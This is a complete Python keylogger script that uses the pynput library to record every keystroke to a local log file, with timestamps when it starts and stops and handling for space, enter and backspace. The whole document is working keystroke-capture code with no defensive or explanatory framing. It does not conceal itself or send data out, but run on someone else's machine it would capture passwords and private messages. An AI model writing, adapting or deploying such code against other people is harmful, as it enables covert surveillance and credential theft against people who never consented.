from pynput import keyboard
import logging
import datetime
import os

log_file = "YOUR_LOG_FILE_PATH_HERE"  # Replace with your desired log file path
    
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')

f = open(log_file, "a", encoding="utf-8")
f.write("\n=== Keylogger started at " + datetime.datetime.now().strftime("%H:%M:%S") + " ===\n")
f.flush()

def on_press(key):
    if key == keyboard.Key.esc:
        # Stop listener
        f.write("\n=== Keylogger stopped at " + datetime.datetime.now().strftime("%H:%M:%S") + " ===\n")
        f.flush()
        f.close()
        exit()

    try:
        f.write(key.char)
        f.flush()

    except AttributeError:
        if key == keyboard.Key.space:
            f.write(" ")

        if key == keyboard.Key.enter:
            f.write("\n")

        if key == keyboard.Key.backspace:
            with open(log_file, "rb+") as e:
                e.seek(0, 2)          # Go to the end
                size = e.tell()

                if size > 0:
                    e.truncate(size - 1)

        else:
            pass

        f.flush()

def on_release(key):
    pass

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()